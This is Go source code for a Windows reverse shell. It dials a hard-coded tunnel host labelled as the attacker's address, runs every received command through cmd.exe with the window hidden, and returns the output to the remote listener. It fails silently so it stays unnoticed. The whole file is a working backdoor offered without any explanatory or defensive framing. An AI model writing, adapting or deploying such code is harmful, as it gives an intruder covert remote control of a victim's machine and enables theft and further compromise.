package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"syscall"
)

// Set your attacker IP and port here
const ATTACKER_IP = "koxql-2605-f500-4-4461-af24-95eb-f2f0-9ff1.a.free.pinggy.link"
const ATTACKER_PORT = "46875"

func main() {
	connection, err := net.Dial("tcp", ATTACKER_IP+":"+ATTACKER_PORT)
	if err != nil {
		// Silently exit if connection fails
		return
	}
	defer connection.Close()

	for {
		// Read command from listener
		message, err := bufio.NewReader(connection).ReadString('\n')
		if err != nil {
			// Silently exit if reading fails
			return
		}

		// Execute the command in a shell
		// Using "cmd.exe" for a classic Windows command prompt
		cmd := exec.Command("cmd.exe", "/C", strings.TrimSuffix(message, "\n"))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := cmd.CombinedOutput()

		// Send output back to the listener
		if err != nil {
			fmt.Fprintf(connection, "%s\n", err.Error())
		}
		fmt.Fprintf(connection, "%s", output)
	}
}

